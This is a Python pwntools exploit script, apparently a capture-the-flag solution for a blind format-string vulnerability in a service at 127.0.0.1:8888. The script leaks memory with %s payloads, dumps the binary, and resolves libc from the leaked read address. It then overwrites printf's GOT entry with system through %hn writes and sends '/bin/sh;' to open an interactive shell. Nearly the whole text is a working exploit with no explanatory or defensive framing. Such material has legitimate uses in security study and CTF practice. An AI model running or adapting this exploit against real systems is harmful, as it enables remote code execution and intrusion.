#coding=utf8
import math
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = 'debug'
context.arch = 'amd64'
ip = "127.0.0.1"
port = 8888
def leak(addr):
	num  = 0
	while num < 3:
		try:
#			print 'leak addr: ' + hex(addr)
			p = remote(ip,port)
			payload = '%00008$s'+'STARTEND'+p64(addr)
			if '\x0a' in payload:
				return None
			p.sendline(payload)
			date = p.recvuntil('STARTEND',drop = True)
			p.close()
			return date
		except Exception:
			num += 1
			continue
	return None
def getbinary():
	addr = 0x400000
	f = open('binary','w')
	while addr<0x401000:
		date = leak(addr)
		if date is None:
			f.write('\xff')
			addr +=1
		elif len(date) == 0:
			f.write('\x00')
			addr +=1
		else:
			f.write(date)
			addr +=len(date)
	f.close()
#getbinary()
read_got = 0x404020
printf_got = 0x404018
log.success('Read   Got: ' + hex(read_got))
log.success('Printf Got: ' + hex(printf_got))
sh =remote(ip,port)
# let the read get resolved
sh.sendline('A')
sh.recv()
# get printf addr
payload = '%00008$s' + 'STARTEND' + p64(read_got)
sh.sendline(payload)
read_addr = u64(sh.recvuntil('STARTEND', drop=True).ljust(8, '\x00'))
sh.recv()

# get system addr
libc = LibcSearcher('read', read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
log.success('system addr: ' + hex(system_addr))
log.success('read   addr: ' + hex(read_addr))
# modify printf_got
def modify(modify_addr,address):
	modify_addr1 = modify_addr>>48
	modify_addr2 = modify_addr>>32&0xffff
	modify_addr3 = modify_addr>>16&0xffff
	modify_addr4 = modify_addr&0xffff
	print 'Modify_Addr1:'+str(modify_addr1)
	print 'Modify_Addr2:'+str(modify_addr2)
	print 'Modify_Addr3:'+str(modify_addr3)
	print 'Modify_Addr4:'+str(modify_addr4)
	if modify_addr1 != 0: 
		payload = '%'+str(modify_addr1)+'c%6$hn'+'%'+str(modify_addr2-modify_addr1)+'c%7$hn'+'%' + str(modify_addr3-modify_addr2)+'c%8$hn'+'%'+str(modify_addr4-modify_addr3)+'c%9$hn'
	else:
		payload = '%6$hn'+'%'+str(modify_addr2-modify_addr1)+'c%7$hn'+'%' + str(modify_addr3-modify_addr2)+'c%8$hn'+'%'+str(modify_addr4-modify_addr3)+'c%9$hn'
	offset = (int)(math.ceil(len(payload) / 8.0) + 1)
	for i in range(6,10):
		old = '%{}$'.format(i)
		new = '%{}$'.format(offset + i)
		payload = payload.replace(old, new)
	remain = (8 - len(payload)%8)*'A'
	payload += remain
	payload +=p64(address+6)+p64(address+4)+p64(address + 2) +p64(address)
	sh.sendline(payload)
modify(system_addr,printf_got)
sh.recvrepeat(0.5)
# get shell
sh.sendline('/bin/sh;')
sh.interactive()
